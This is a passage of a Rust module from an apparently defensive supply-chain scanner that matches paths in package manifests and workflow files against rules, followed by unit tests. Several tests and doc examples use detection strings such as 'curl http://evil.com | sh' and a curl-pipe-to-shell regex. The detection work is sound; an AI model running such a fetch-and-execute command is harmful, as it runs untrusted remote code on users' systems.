//! Key-Value condition evaluator for structured manifest files.
#![allow(clippy::unwrap_used, clippy::expect_used)]
//!
//! Supports querying JSON, YAML, and TOML manifests using path expressions.
//!
//! # Path Syntax
//! - `key` - Access object key
//! - `a.b.c` - Nested access
//! - `[0]` - Array index
//! - `[*]` - All array elements (wildcard)
//!
//! # Examples
//! ```yaml
//! # Check if permissions array contains "debugger"
//! type: kv
//! path: "permissions"
//! exact: "debugger"
//!
//! # Check if any content script targets all URLs
//! type: kv
//! path: "content_scripts[*].matches"
//! exact: "<all_urls>"
//!
//! # Check if postinstall script contains curl
//! type: kv
//! path: "scripts.postinstall"
//! substr: "curl"
//! ```

use crate::composite_rules::condition::Condition;
use crate::composite_rules::context::EvaluationContext;
use crate::types::Evidence;
use regex::Regex;
use serde_json::Value;
use std::path::Path;

/// Detected format of the structured data file.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub(crate) enum StructuredFormat {
    /// JSON format
    Json,
    /// YAML format
    Yaml,
    /// TOML format
    Toml,
    /// Apple Property List (XML or Binary)
    Plist,
    /// Python PKG-INFO / METADATA (RFC 822 format)
    PkgInfo,
    /// Format could not be determined
    Unknown,
}

/// A segment in a parsed path expression.
#[derive(Debug, Clone, PartialEq, Eq)]
pub(crate) enum PathSegment {
    /// Object key access: `"permissions"` or `"scripts"`
    Key(String),
    /// Array index access: `[0]`, `[1]`
    Index(usize),
    /// Wildcard array access: `[*]` - matches all elements
    Wildcard,
}

/// Matcher for comparing values at a path.
#[derive(Debug, Default)]
pub(crate) struct KvMatcher {
    /// Require exact string equality
    pub exact: Option<String>,
    /// Require the value to contain this substring
    pub substr: Option<String>,
    /// Require the value to match this compiled regex
    pub regex: Option<Regex>,
    /// If true, perform case-insensitive matching
    pub case_insensitive: bool,
    /// Explicit existence check (Some(true) = must exist, Some(false) = must not exist)
    /// Note: exists check is handled in evaluate_kv before matches() is called
    #[allow(dead_code)]
    pub exists: Option<bool>,
    /// Minimum collection size (array elements or object keys)
    pub size_min: Option<usize>,
    /// Maximum collection size (array elements or object keys)
    pub size_max: Option<usize>,
}

impl KvMatcher {
    /// Create a new matcher from condition parameters.
    #[must_use]
    pub(crate) fn new(
        exact: Option<&String>,
        substr: Option<&String>,
        regex: Option<&Regex>,
        case_insensitive: bool,
        exists: Option<bool>,
        size_min: Option<usize>,
        size_max: Option<usize>,
    ) -> Self {
        Self {
            exact: exact.cloned(),
            substr: substr.cloned(),
            regex: regex.cloned(),
            case_insensitive,
            exists,
            size_min,
            size_max,
        }
    }

    /// Check if a value matches this matcher.
    ///
    /// For arrays, returns true if any element matches (for string matchers).
    /// For scalars, checks the value directly.
    /// If no matcher is specified (existence check), returns true.
    /// Also checks size constraints for collections.
    #[must_use]
    pub(crate) fn matches(&self, value: &Value) -> bool {
        // Check size constraints FIRST (applies to arrays and objects)
        match value {
            Value::Array(arr) => {
                if let Some(min) = self.size_min {
                    if arr.len() < min {
                        return false;
                    }
                }
                if let Some(max) = self.size_max {
                    if arr.len() > max {
                        return false;
                    }
                }
            }
            Value::Object(obj) => {
                if let Some(min) = self.size_min {
                    if obj.len() < min {
                        return false;
                    }
                }
                if let Some(max) = self.size_max {
                    if obj.len() > max {
                        return false;
                    }
                }
            }
            _ => {
                // Scalars - size constraints don't apply
                // If size constraints are specified on a scalar, fail the match
                if self.size_min.is_some() || self.size_max.is_some() {
                    return false;
                }
            }
        }

        // If no string matcher specified, just check existence (path resolved)
        if self.exact.is_none() && self.substr.is_none() && self.regex.is_none() {
            return true;
        }

        match value {
            Value::Array(arr) => {
                // For arrays, check if any element matches
                arr.iter().any(|v| self.scalar_matches(v))
            }
            _ => self.scalar_matches(value),
        }
    }

    /// Check if a scalar value matches the matcher.
    fn scalar_matches(&self, value: &Value) -> bool {
        let s = value_to_string(value);

        if let Some(ref exact_val) = self.exact {
            return if self.case_insensitive {
                s.eq_ignore_ascii_case(exact_val)
            } else {
                s == *exact_val
            };
        }

        if let Some(ref substr_val) = self.substr {
            return if self.case_insensitive {
                s.to_lowercase().contains(&substr_val.to_lowercase())
            } else {
                s.contains(substr_val.as_str())
            };
        }

        if let Some(ref re) = self.regex {
            return re.is_match(&s);
        }

        false
    }
}

/// Convert a JSON value to a string for matching.
fn value_to_string(value: &Value) -> String {
    match value {
        Value::String(s) => s.clone(),
        Value::Number(n) => n.to_string(),
        Value::Bool(b) => b.to_string(),
        Value::Null => "null".to_string(),
        // For arrays and objects, serialize to JSON string
        _ => value.to_string(),
    }
}

/// Detect the format of a structured data file.
///
/// Only recognizes known manifest filenames to avoid processing arbitrary structured data files.
/// This ensures we only parse files we have explicit support for.
#[must_use]
pub(crate) fn detect_format(path: &Path, content: &[u8]) -> StructuredFormat {
    let path_str = path.to_string_lossy().to_lowercase();

    // Check filename patterns for known manifests
    if let Some(name) = path.file_name().and_then(|n| n.to_str()) {
        let name_lower = name.to_lowercase();

        // Known JSON manifests
        if name_lower == "package.json"
            || name_lower == "manifest.json"
            || name_lower == "composer.json"
        {
            return StructuredFormat::Json;
        }

        // Known TOML manifests
        if name_lower == "cargo.toml" || name_lower == "pyproject.toml" {
            return StructuredFormat::Toml;
        }

        // Known YAML files - GitHub Actions workflows
        if (path_str.contains(".github/workflows/") || path_str.contains(".github\\workflows\\"))
            && (name_lower.ends_with(".yml") || name_lower.ends_with(".yaml"))
        {
            return StructuredFormat::Yaml;
        }

        // Python package metadata files (RFC 822 format)
        if name_lower == "pkg-info" || name_lower == "metadata" {
            return StructuredFormat::PkgInfo;
        }

        // Plist files - check by extension since they're commonly used in macOS apps
        if name_lower.ends_with(".plist") {
            return StructuredFormat::Plist;
        }
    }

    // Limited content sniffing for special cases only
    // Check binary magic bytes BEFORE UTF-8 conversion for performance

    // Check for Binary Plist (binary format)
    if content.starts_with(b"bplist") {
        return StructuredFormat::Plist;
    }

    // Check for XML Plist (text format)
    if content.starts_with(b"<?xml") {
        // Only convert minimal bytes needed to check for plist
        let preview = &content[..content.len().min(200)];
        let preview_str = String::from_utf8_lossy(preview);
        if preview_str.contains("<plist") || preview_str.contains("<!DOCTYPE plist") {
            return StructuredFormat::Plist;
        }
    }
    if content.starts_with(b"<plist") {
        return StructuredFormat::Plist;
    }

    // Check for PKG-INFO/METADATA format (RFC 822 headers)
    // Only convert first 200 bytes for header check
    let preview = &content[..content.len().min(200)];
    let preview_str = String::from_utf8_lossy(preview);
    let trimmed = preview_str.trim_start();

    if trimmed.starts_with("Metadata-Version:") {
        return StructuredFormat::PkgInfo;
    }

    // No other content sniffing - only process known filenames
    StructuredFormat::Unknown
}

/// Parse a path string into segments.
///
/// # Examples
/// - `"permissions"` -> `[Key("permissions")]`
/// - `"scripts.postinstall"` -> `[Key("scripts"), Key("postinstall")]`
/// - `"content_scripts[*].matches"` -> `[Key("content_scripts"), Wildcard, Key("matches")]`
/// - `"items[0]"` -> `[Key("items"), Index(0)]`
pub(crate) fn parse_path(path: &str) -> Result<Vec<PathSegment>, String> {
    let mut segments = Vec::new();
    let mut current_key = String::new();
    let mut chars = path.chars().peekable();

    while let Some(c) = chars.next() {
        match c {
            '.' => {
                if !current_key.is_empty() {
                    segments.push(PathSegment::Key(current_key.clone()));
                    current_key.clear();
                }
            }
            '[' => {
                if !current_key.is_empty() {
                    segments.push(PathSegment::Key(current_key.clone()));
                    current_key.clear();
                }

                // Parse index or wildcard
                let mut index_str = String::new();
                while let Some(&next_c) = chars.peek() {
                    if next_c == ']' {
                        chars.next();
                        break;
                    }
                    if let Some(ch) = chars.next() {
                        index_str.push(ch);
                    }
                }

                if index_str == "*" {
                    segments.push(PathSegment::Wildcard);
                } else if let Ok(idx) = index_str.parse::<usize>() {
                    segments.push(PathSegment::Index(idx));
                } else {
                    return Err(format!("invalid array index: [{}]", index_str));
                }
            }
            _ => {
                current_key.push(c);
            }
        }
    }

    if !current_key.is_empty() {
        segments.push(PathSegment::Key(current_key));
    }

    if segments.is_empty() {
        return Err("empty path".to_string());
    }

    Ok(segments)
}

/// Navigate to a path in a JSON value and return all matching values.
///
/// Wildcards expand to multiple values.
#[must_use]
pub(crate) fn navigate<'a>(value: &'a Value, segments: &[PathSegment]) -> Vec<&'a Value> {
    if segments.is_empty() {
        return vec![value];
    }

    let segment = &segments[0];
    let remaining = &segments[1..];

    match segment {
        PathSegment::Key(key) => {
            if let Value::Object(obj) = value {
                if let Some(v) = obj.get(key) {
                    return navigate(v, remaining);
                }
            }
            Vec::new()
        }
        PathSegment::Index(idx) => {
            if let Value::Array(arr) = value {
                if let Some(v) = arr.get(*idx) {
                    return navigate(v, remaining);
                }
            }
            Vec::new()
        }
        PathSegment::Wildcard => {
            if let Value::Array(arr) = value {
                let mut results = Vec::new();
                for item in arr {
                    results.extend(navigate(item, remaining));
                }
                return results;
            }
            Vec::new()
        }
    }
}

/// Parse PKG-INFO/METADATA format (RFC 822) into a JSON Value.
///
/// Format is simple key-value headers:
/// ```text
/// Metadata-Version: 2.1
/// Name: my-package
/// Version: 1.0.0
/// Summary: A package description
/// Author: Someone <someone@example.com>
/// ```
///
/// Multi-line values use continuation lines (starting with whitespace).
/// Multiple values for the same key become arrays.
fn parse_pkginfo(content: &[u8]) -> Option<Value> {
    let text = std::str::from_utf8(content).ok()?;
    let mut map: serde_json::Map<String, Value> = serde_json::Map::new();
    let mut current_key: Option<String> = None;
    let mut current_value = String::new();

    for line in text.lines() {
        if line.starts_with(' ') || line.starts_with('\t') {
            // Continuation line - append to current value
            if current_key.is_some() {
                current_value.push('\n');
                current_value.push_str(line.trim());
            }
        } else if let Some(colon_pos) = line.find(':') {
            // New header - save previous if any
            if let Some(key) = current_key.take() {
                insert_pkginfo_value(&mut map, &key, current_value.trim().to_string());
            }

            let key = line[..colon_pos].trim().to_string();
            let value = line[colon_pos + 1..].trim().to_string();
            current_key = Some(key);
            current_value = value;
        }
    }

    // Don't forget the last header
    if let Some(key) = current_key {
        insert_pkginfo_value(&mut map, &key, current_value.trim().to_string());
    }

    Some(Value::Object(map))
}

/// Insert a value into PKG-INFO map, handling multiple values for same key.
fn insert_pkginfo_value(map: &mut serde_json::Map<String, Value>, key: &str, value: String) {
    if value.is_empty() {
        return;
    }

    // Normalize key to lowercase with hyphens (like HTTP headers)
    let normalized_key = key.to_lowercase();

    if let Some(existing) = map.get_mut(&normalized_key) {
        // Key already exists - convert to array or append
        match existing {
            Value::Array(arr) => {
                arr.push(Value::String(value));
            }
            Value::String(s) => {
                let old = s.clone();
                *existing = Value::Array(vec![Value::String(old), Value::String(value)]);
            }
            _ => {}
        }
    } else {
        map.insert(normalized_key, Value::String(value));
    }
}

/// Evaluate a kv condition against file content using cached format detection and parsing.
///
/// Returns Some(Evidence) if the condition matches, None otherwise.
#[must_use]
pub(crate) fn evaluate_kv(condition: &Condition, ctx: &EvaluationContext<'_>) -> Option<Evidence> {
    let Condition::Kv {
        path,
        exact,
        substr,
        regex: _,
        case_insensitive,
        exists,
        size_min,
        size_max,
        compiled_regex,
    } = condition
    else {
        return None;
    };

    // Get the string regex pattern for debug
    let regex_str = if let Condition::Kv { regex, .. } = condition {
        regex.clone()
    } else {
        None
    };

    let file_path = std::path::Path::new(&ctx.report.target.path);
    let content = ctx.binary_data;

    // Debug: check if regex should be compiled but isn't
    if std::env::var("DEBUG_KV_REGEX").is_ok() && regex_str.is_some() && compiled_regex.is_none() {
        eprintln!(
            "DEBUG_KV_REGEX: path={} has regex={:?} but compiled_regex is NONE!",
            path, regex_str
        );
    }

    // Check cached format, detect if not cached
    let format = ctx
        .cached_kv_format
        .get_or_init(|| detect_format(file_path, content));

    // If format is unknown, no need to parse
    if *format == StructuredFormat::Unknown {
        return None;
    }

    // Check cached parsed data, parse if not cached
    let parsed = ctx.cached_kv_parsed.get_or_init(|| {
        let parsed_value: Option<Value> = match format {
            StructuredFormat::Json => serde_json::from_slice(content).ok(),
            StructuredFormat::Yaml => serde_yaml::from_slice(content).ok(),
            StructuredFormat::Toml => std::str::from_utf8(content)
                .ok()
                .and_then(|s| toml::from_str(s).ok()),
            StructuredFormat::Plist => plist::from_bytes(content).ok(),
            StructuredFormat::PkgInfo => parse_pkginfo(content),
            StructuredFormat::Unknown => None,
        };

        // Box the value for caching (or use a sentinel null value if parsing failed)
        Box::new(parsed_value.unwrap_or(Value::Null))
    });

    // If parsing failed (stored as Null sentinel), return None
    if parsed.is_null() {
        return None;
    }

    // Navigate path
    let segments = parse_path(path).ok()?;
    let values = navigate(parsed, &segments);

    // Handle exists check
    let path_found = !values.is_empty();
    if let Some(should_exist) = exists {
        if *should_exist && !path_found {
            // exists: true but path not found - no match
            return None;
        }
        if !*should_exist && path_found {
            // exists: false but path found - no match
            return None;
        }
        if !*should_exist && !path_found {
            // exists: false and path not found - match!
            return Some(Evidence {
                method: "kv".to_string(),
                source: file_path.display().to_string(),
                value: format!("field '{}' does not exist", path),
                location: Some(path.clone()),
            });
        }
    }

    if values.is_empty() {
        return None; // Path not found
    }

    // Build matcher
    let matcher = KvMatcher::new(
        exact.as_ref(),
        substr.as_ref(),
        compiled_regex.as_ref(),
        *case_insensitive,
        *exists,
        *size_min,
        *size_max,
    );

    // Check if any value matches
    for value in &values {
        if matcher.matches(value) {
            let matched_value = format_evidence_value_with_size(value, *size_min, *size_max);
            return Some(Evidence {
                method: "kv".to_string(),
                source: file_path.display().to_string(),
                value: matched_value,
                location: Some(path.clone()),
            });
        }
    }

    None
}

/// Format a value for evidence display with optional size information.
fn format_evidence_value_with_size(
    value: &Value,
    size_min: Option<usize>,
    size_max: Option<usize>,
) -> String {
    // If size constraints were used, include size info in the output
    let size_info = if size_min.is_some() || size_max.is_some() {
        match value {
            Value::Array(arr) => Some(format!("size: {} (array)", arr.len())),
            Value::Object(obj) => Some(format!("size: {} (object)", obj.len())),
            _ => None,
        }
    } else {
        None
    };

    let s = match value {
        Value::String(s) => s.clone(),
        Value::Array(arr) => {
            // Format array elements
            let items: Vec<String> = arr.iter().map(value_to_string).collect();
            format!("[{}]", items.join(", "))
        }
        _ => value_to_string(value),
    };

    // Truncate if too long
    let truncated = if s.len() > 200 {
        format!("{}...", &s[..197])
    } else {
        s
    };

    // Append size info if present
    match size_info {
        Some(info) => format!("{} ({})", truncated, info),
        None => truncated,
    }
}

/// Format a value for evidence display (truncated if necessary).
#[allow(dead_code)]
fn format_evidence_value(value: &Value) -> String {
    format_evidence_value_with_size(value, None, None)
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::composite_rules::context::EvaluationContext;
    use crate::composite_rules::types::{FileType, Platform};
    use crate::types::{AnalysisReport, TargetInfo};
    use serde_json::json;
    use std::sync::OnceLock;

    /// Helper to create evaluation context for testing
    fn create_test_ctx<'a>(
        binary_data: &'a [u8],
        path: &'a std::path::Path,
    ) -> EvaluationContext<'a> {
        // Create minimal report with the path we need
        let report = Box::leak(Box::new(AnalysisReport::new(TargetInfo {
            path: path.display().to_string(),
            file_type: "test".to_string(),
            size_bytes: binary_data.len() as u64,
            sha256: "test".to_string(),
            architectures: None,
        })));

        EvaluationContext {
            report,
            binary_data,
            file_type: FileType::All,
            platforms: vec![Platform::All],
            additional_findings: None,
            cached_ast: None,
            finding_id_index: None,
            debug_collector: None,
            section_map: None,
            inline_yara_results: None,
            cached_kv_format: OnceLock::new(),
            cached_kv_parsed: OnceLock::new(),
        }
    }

    /// Test wrapper for evaluate_kv that creates context automatically
    fn evaluate_kv_test(
        condition: &Condition,
        data: &[u8],
        path: &std::path::Path,
    ) -> Option<Evidence> {
        let ctx = create_test_ctx(data, path);
        evaluate_kv(condition, &ctx)
    }

    // ==========================================================================
    // Path Parsing Tests
    // ==========================================================================

    #[test]
    fn test_path_simple_key() {
        assert_eq!(
            parse_path("permissions").unwrap(),
            vec![PathSegment::Key("permissions".to_string())]
        );
    }

    #[test]
    fn test_path_nested() {
        assert_eq!(
            parse_path("scripts.postinstall").unwrap(),
            vec![
                PathSegment::Key("scripts".to_string()),
                PathSegment::Key("postinstall".to_string())
            ]
        );
    }

    #[test]
    fn test_path_array_index() {
        assert_eq!(
            parse_path("content_scripts[0].matches").unwrap(),
            vec![
                PathSegment::Key("content_scripts".to_string()),
                PathSegment::Index(0),
                PathSegment::Key("matches".to_string())
            ]
        );
    }

    #[test]
    fn test_path_wildcard() {
        assert_eq!(
            parse_path("content_scripts[*].matches").unwrap(),
            vec![
                PathSegment::Key("content_scripts".to_string()),
                PathSegment::Wildcard,
                PathSegment::Key("matches".to_string())
            ]
        );
    }

    #[test]
    fn test_path_deep_nesting() {
        assert_eq!(
            parse_path("a.b.c.d.e").unwrap(),
            vec![
                PathSegment::Key("a".to_string()),
                PathSegment::Key("b".to_string()),
                PathSegment::Key("c".to_string()),
                PathSegment::Key("d".to_string()),
                PathSegment::Key("e".to_string())
            ]
        );
    }

    #[test]
    fn test_path_multiple_wildcards() {
        assert_eq!(
            parse_path("content_scripts[*].matches[*]").unwrap(),
            vec![
                PathSegment::Key("content_scripts".to_string()),
                PathSegment::Wildcard,
                PathSegment::Key("matches".to_string()),
                PathSegment::Wildcard
            ]
        );
    }

    #[test]
    fn test_path_key_with_hyphen() {
        assert_eq!(
            parse_path("dev-dependencies.serde").unwrap(),
            vec![
                PathSegment::Key("dev-dependencies".to_string()),
                PathSegment::Key("serde".to_string())
            ]
        );
    }

    #[test]
    fn test_path_empty() {
        assert!(parse_path("").is_err());
    }

    // ==========================================================================
    // Navigation Tests
    // ==========================================================================

    #[test]
    fn test_navigate_simple() {
        let json = json!({"permissions": ["a", "b"]});
        let segments = parse_path("permissions").unwrap();
        let values = navigate(&json, &segments);
        assert_eq!(values, vec![&json!(["a", "b"])]);
    }

    #[test]
    fn test_navigate_nested() {
        let json = json!({"scripts": {"postinstall": "npm build"}});
        let segments = parse_path("scripts.postinstall").unwrap();
        let values = navigate(&json, &segments);
        assert_eq!(values, vec![&json!("npm build")]);
    }

    #[test]
    fn test_navigate_missing_key() {
        let json = json!({"scripts": {}});
        let segments = parse_path("scripts.postinstall").unwrap();
        let values = navigate(&json, &segments);
        assert!(values.is_empty());
    }

    #[test]
    fn test_navigate_wildcard_expands() {
        let json = json!({
            "items": [
                {"name": "a"},
                {"name": "b"},
                {"name": "c"}
            ]
        });
        let segments = parse_path("items[*].name").unwrap();
        let values = navigate(&json, &segments);
        assert_eq!(values, vec![&json!("a"), &json!("b"), &json!("c")]);
    }

    #[test]
    fn test_navigate_index() {
        let json = json!({"items": ["a", "b", "c"]});
        let segments = parse_path("items[1]").unwrap();
        let values = navigate(&json, &segments);
        assert_eq!(values, vec![&json!("b")]);
    }

    #[test]
    fn test_navigate_index_out_of_bounds() {
        let json = json!({"items": ["a", "b"]});
        let segments = parse_path("items[5]").unwrap();
        let values = navigate(&json, &segments);
        assert!(values.is_empty());
    }

    #[test]
    fn test_navigate_wildcard_on_non_array() {
        let json = json!({"items": "not an array"});
        let segments = parse_path("items[*]").unwrap();
        let values = navigate(&json, &segments);
        assert!(values.is_empty());
    }

    // ==========================================================================
    // Matcher Tests
    // ==========================================================================

    #[test]
    fn test_exact_in_array() {
        let matcher = KvMatcher {
            exact: Some("debugger".to_string()),
            ..Default::default()
        };
        assert!(matcher.matches(&json!(["storage", "debugger", "tabs"])));
        assert!(!matcher.matches(&json!(["storage", "tabs"])));
    }

    #[test]
    fn test_exact_scalar() {
        let matcher = KvMatcher {
            exact: Some("document_start".to_string()),
            ..Default::default()
        };
        assert!(matcher.matches(&json!("document_start")));
        assert!(!matcher.matches(&json!("document_end")));
        assert!(!matcher.matches(&json!("document_start_extra")));
    }

    #[test]
    fn test_substr_scalar() {
        let matcher = KvMatcher {
            substr: Some("curl".to_string()),
            ..Default::default()
        };
        assert!(matcher.matches(&json!("curl http://evil.com | sh")));
        assert!(!matcher.matches(&json!("wget http://evil.com")));
    }

    #[test]
    fn test_substr_in_array() {
        let matcher = KvMatcher {
            substr: Some("amazon".to_string()),
            ..Default::default()
        };
        assert!(matcher.matches(&json!(["*://*.amazon.com/*", "*://*.ebay.com/*"])));
        assert!(!matcher.matches(&json!(["*://*.google.com/*"])));
    }

    #[test]
    fn test_regex_match() {
        let re = Regex::new(r"curl.*\|.*sh").unwrap();
        let matcher = KvMatcher {
            regex: Some(re),
            ..Default::default()
        };
        assert!(matcher.matches(&json!("curl http://evil.com | sh")));
        assert!(!matcher.matches(&json!("curl http://evil.com")));
    }

    #[test]
    fn test_regex_in_array() {
        let re = Regex::new(r"amazon|ebay").unwrap();
        let matcher = KvMatcher {
            regex: Some(re),
            ..Default::default()
        };
        assert!(matcher.matches(&json!(["*://*.amazon.com/*"])));
        assert!(matcher.matches(&json!(["*://*.ebay.com/*"])));
        assert!(!matcher.matches(&json!(["*://*.google.com/*"])));
    }

    #[test]
    fn test_case_insensitive_exact() {
        let matcher = KvMatcher {
            exact: Some("DEBUGGER".to_string()),
            case_insensitive: true,
            ..Default::default()
        };
        assert!(matcher.matches(&json!("debugger")));
        assert!(matcher.matches(&json!("DEBUGGER")));
        assert!(matcher.matches(&json!("Debugger")));
    }

    #[test]
    fn test_case_insensitive_substr() {
        let matcher = KvMatcher {
            substr: Some("curl".to_string()),
            case_insensitive: true,
            ..Default::default()
        };
        assert!(matcher.matches(&json!("CURL http://evil.com")));
        assert!(matcher.matches(&json!("Curl http://evil.com")));
    }

    #[test]
    fn test_existence_only() {
        let matcher = KvMatcher::default();
        assert!(matcher.matches(&json!("anything")));
        assert!(matcher.matches(&json!(null)));
        assert!(matcher.matches(&json!([])));
    }

    #[test]
    fn test_number_matching() {
        let matcher = KvMatcher {
            exact: Some("2".to_string()),
            ..Default::default()
        };
        assert!(matcher.matches(&json!(2)));
        assert!(matcher.matches(&json!("2")));
        assert!(!matcher.matches(&json!(3)));
    }

    #[test]
    fn test_boolean_matching() {
        let matcher = KvMatcher {
            exact: Some("true".to_string()),
            ..Default::default()
        };
        assert!(matcher.matches(&json!(true)));
        assert!(!matcher.matches(&json!(false)));
    }

    // ==========================================================================
    // Size Constraint Tests
    // ==========================================================================

    #[test]
    fn test_array_size_min() {
        let matcher = KvMatcher {
            size_min: Some(2),
            ..Default::default()
        };
        // Array with 3 elements should pass size_min: 2
        assert!(matcher.matches(&json!(["a", "b", "c"])));
        // Array with 1 element should fail size_min: 2
        assert!(!matcher.matches(&json!(["a"])));
        // Empty array should fail size_min: 2
        assert!(!matcher.matches(&json!([])));
    }

    #[test]
    fn test_array_size_max() {
        let matcher = KvMatcher {
            size_max: Some(2),
            ..Default::default()
        };
        // Array with 1 element should pass size_max: 2
        assert!(matcher.matches(&json!(["a"])));
        // Array with 2 elements should pass size_max: 2
        assert!(matcher.matches(&json!(["a", "b"])));
        // Array with 3 elements should fail size_max: 2
        assert!(!matcher.matches(&json!(["a", "b", "c"])));
    }

    #[test]
    fn test_array_size_exact() {
        let matcher = KvMatcher {
            size_min: Some(1),
            size_max: Some(1),
            ..Default::default()
        };
        // Exactly 1 element should pass
        assert!(matcher.matches(&json!(["single"])));
        // 0 elements should fail
        assert!(!matcher.matches(&json!([])));
        // 2 elements should fail
        assert!(!matcher.matches(&json!(["a", "b"])));
    }

    #[test]
    fn test_array_size_empty() {
        let matcher = KvMatcher {
            size_min: Some(0),
            size_max: Some(0),
            ..Default::default()
        };
        // Empty array should pass
        assert!(matcher.matches(&json!([])));
        // Non-empty array should fail
        assert!(!matcher.matches(&json!(["a"])));
    }

    #[test]
    fn test_object_size_min() {
        let matcher = KvMatcher {
            size_min: Some(2),
            ..Default::default()
        };
        // Object with 3 keys should pass size_min: 2
        assert!(matcher.matches(&json!({"a": 1, "b": 2, "c": 3})));
        // Object with 1 key should fail size_min: 2
        assert!(!matcher.matches(&json!({"a": 1})));
        // Empty object should fail size_min: 2
        assert!(!matcher.matches(&json!({})));
    }

    #[test]
    fn test_object_size_max() {
        let matcher = KvMatcher {
            size_max: Some(2),
            ..Default::default()
        };
        // Object with 1 key should pass size_max: 2
        assert!(matcher.matches(&json!({"a": 1})));
        // Object with 2 keys should pass size_max: 2
        assert!(matcher.matches(&json!({"a": 1, "b": 2})));
        // Object with 3 keys should fail size_max: 2
        assert!(!matcher.matches(&json!({"a": 1, "b": 2, "c": 3})));
    }

    #[test]
    fn test_object_size_empty() {
        let matcher = KvMatcher {
            size_max: Some(0),
            ..Default::default()
        };
        // Empty object should pass
        assert!(matcher.matches(&json!({})));
        // Non-empty object should fail
        assert!(!matcher.matches(&json!({"a": 1})));
    }

    #[test]
    fn test_size_on_scalar_fails() {
        let matcher = KvMatcher {
            size_min: Some(1),
            ..Default::default()
        };
        // Scalars should fail size constraints
        assert!(!matcher.matches(&json!("string")));
        assert!(!matcher.matches(&json!(123)));
        assert!(!matcher.matches(&json!(true)));
        assert!(!matcher.matches(&json!(null)));
    }

    #[test]
    fn test_size_with_string_matcher() {
        // Size constraint + string matching should both apply
        let matcher = KvMatcher {
            substr: Some("alice".to_string()),
            size_min: Some(1),
            size_max: Some(2),
            ..Default::default()
        };
        // Array with 1 element containing "alice" should pass
        assert!(matcher.matches(&json!(["alice@example.com"])));
        // Array with 2 elements containing "alice" should pass
        assert!(matcher.matches(&json!(["bob@example.com", "alice@example.com"])));
        // Array with 3 elements should fail (exceeds size_max)
        assert!(!matcher.matches(&json!([
            "alice@example.com",
            "bob@example.com",
            "charlie@example.com"
        ])));
        // Array with 1 element NOT containing "alice" should fail (string match fails)
        assert!(!matcher.matches(&json!(["bob@example.com"])));
    }

    // ==========================================================================
    // Exists Check Tests (via evaluate_kv)
    // ==========================================================================

    #[test]
    fn test_exists_false_match() {
        // exists: false should match when path does NOT exist
        let package_json = br#"{"name": "test", "version": "1.0.0"}"#;
        let path = Path::new("package.json");

        let cond = Condition::Kv {
            path: "description".to_string(),
            exact: None,
            substr: None,
            regex: None,
            case_insensitive: false,
            exists: Some(false),
            size_min: None,
            size_max: None,
            compiled_regex: None,
        };

        // "description" doesn't exist, so exists: false should match
        assert!(evaluate_kv_test(&cond, package_json, path).is_some());
    }

    #[test]
    fn test_exists_false_no_match() {
        // exists: false should NOT match when path exists
        let package_json = br#"{"name": "test", "description": "A test"}"#;
        let path = Path::new("package.json");

        let cond = Condition::Kv {
            path: "description".to_string(),
            exact: None,
            substr: None,
            regex: None,
            case_insensitive: false,
            exists: Some(false),
            size_min: None,
            size_max: None,
            compiled_regex: None,
        };

        // "description" exists, so exists: false should NOT match
        assert!(evaluate_kv_test(&cond, package_json, path).is_none());
    }

    #[test]
    fn test_exists_true_match() {
        // exists: true should match when path exists
        let package_json = br#"{"name": "test", "description": "A test"}"#;
        let path = Path::new("package.json");

        let cond = Condition::Kv {
            path: "description".to_string(),
            exact: None,
            substr: None,
            regex: None,
            case_insensitive: false,
            exists: Some(true),
            size_min: None,
            size_max: None,
            compiled_regex: None,
        };

        // "description" exists, so exists: true should match
        assert!(evaluate_kv_test(&cond, package_json, path).is_some());
    }

    #[test]
    fn test_exists_true_no_match() {
        // exists: true should NOT match when path doesn't exist
        let package_json = br#"{"name": "test", "version": "1.0.0"}"#;
        let path = Path::new("package.json");

        let cond = Condition::Kv {
            path: "description".to_string(),
            exact: None,
            substr: None,
            regex: None,
            case_insensitive: false,
            exists: Some(true),
            size_min: None,
            size_max: None,
            compiled_regex: None,
        };

        // "description" doesn't exist, so exists: true should NOT match
        assert!(evaluate_kv_test(&cond, package_json, path).is_none());
    }

    // ==========================================================================
    // Integration Tests for Size Constraints
    // ==========================================================================

    #[test]
    fn test_single_maintainer_detection() {
        let package_json = br#"{
            "name": "suspicious-package",
            "maintainers": [{"name": "single-author", "email": "author@gmail.com"}]
        }"#;
        let path = Path::new("package.json");

        // Exactly 1 maintainer
        let cond = Condition::Kv {
            path: "maintainers".to_string(),
            exact: None,
            substr: None,
            regex: None,
            case_insensitive: false,
            exists: None,
            size_min: Some(1),
            size_max: Some(1),
            compiled_regex: None,
        };

        assert!(evaluate_kv_test(&cond, package_json, path).is_some());
    }

    #[test]
    fn test_no_dependencies_detection() {
        let package_json = br#"{
            "name": "empty-package",
            "dependencies": {}
        }"#;
        let path = Path::new("package.json");

        // Empty dependencies object
        let cond = Condition::Kv {
            path: "dependencies".to_string(),
            exact: None,
            substr: None,
            regex: None,
            case_insensitive: false,
            exists: None,
            size_min: None,
            size_max: Some(0),
            compiled_regex: None,
        };

        assert!(evaluate_kv_test(&cond, package_json, path).is_some());
    }

    #[test]
    fn test_excessive_keywords_detection() {
        let keywords: Vec<String> = (0..35).map(|i| format!("keyword{}", i)).collect();
        let package_json = format!(
            r#"{{
            "name": "seo-spam-package",
            "keywords": {:?}
        }}"#,
            keywords
        );
        let path = Path::new("package.json");

        // 30+ keywords (SEO spam)
        let cond = Condition::Kv {
            path: "keywords".to_string(),
            exact: None,
            substr: None,
            regex: None,
            case_insensitive: false,
            exists: None,
            size_min: Some(30),
            size_max: None,
            compiled_regex: None,
        };

        assert!(evaluate_kv_test(&cond, package_json.as_bytes(), path).is_some());
    }

    // ==========================================================================
    // Format Detection Tests
    // ==========================================================================

    #[test]
    fn test_detect_known_json_manifests() {
        // Only known JSON manifest filenames are detected
        assert_eq!(
            detect_format(Path::new("manifest.json"), b""),
            StructuredFormat::Json
        );
        assert_eq!(
            detect_format(Path::new("package.json"), b""),
            StructuredFormat::Json
        );
        assert_eq!(
            detect_format(Path::new("composer.json"), b""),
            StructuredFormat::Json
        );
    }

    #[test]
    fn test_detect_github_actions_workflow() {
        // GitHub Actions workflows in .github/workflows/ are detected
        assert_eq!(
            detect_format(Path::new(".github/workflows/ci.yaml"), b""),
            StructuredFormat::Yaml
        );
        assert_eq!(
            detect_format(Path::new(".github/workflows/test.yml"), b""),
            StructuredFormat::Yaml
        );
    }

    #[test]
    fn test_detect_known_toml_manifests() {
        // Known TOML manifests are detected
        assert_eq!(
